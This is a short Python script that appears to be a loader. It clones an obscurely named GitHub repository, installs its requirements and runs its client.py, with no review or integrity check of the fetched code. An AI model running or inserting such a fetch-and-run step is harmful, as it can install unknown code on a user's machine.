import os
import subprocess
import sys

REPO_URL = "https://github.com/yawnerss/livtrmnlasdasd/"
REPO_NAME = "livtrmnlasdasd"

# Clone the repository if it doesn't already exist
if not os.path.exists(REPO_NAME):
    print("[+] Cloning repository...")
    subprocess.check_call(["git", "clone", REPO_URL])
else:
    print("[*] Repository already exists.")

# Change to the repository directory
os.chdir(REPO_NAME)

# Install dependencies if requirements.txt exists
if os.path.exists("requirements.txt"):
    print("[+] Installing requirements...")
    subprocess.check_call([
        sys.executable,
        "-m",
        "pip",
        "install",
        "-r",
        "requirements.txt"
    ])
else:
    print("[!] requirements.txt not found.")

# Run client.py if it exists
if os.path.exists("client.py"):
    print("[+] Starting client.py...")
    subprocess.check_call([sys.executable, "client.py"])
else:
    print("[!] client.py not found.")
